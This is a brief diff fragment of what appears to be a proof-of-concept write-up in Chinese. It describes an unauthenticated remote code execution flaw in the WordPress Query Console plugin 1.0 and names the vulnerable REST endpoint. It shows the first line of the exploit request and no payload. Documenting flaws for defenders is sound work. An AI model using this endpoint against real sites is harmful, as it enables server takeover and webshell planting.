@@ -2,7 +2,7 @@
 
 WordPress Query Console插件1.0版本存在安全缺陷问题，未经身份验证的远程攻击者可利用此插件执行任意PHP代码，调用系统命令可直接造成RCE,植入webshell将进一步获取服务器权限
 
-## poc
+## POC
 
 ```javascript
 POST /wp-json/wqc/v1/query HTTP/1.1
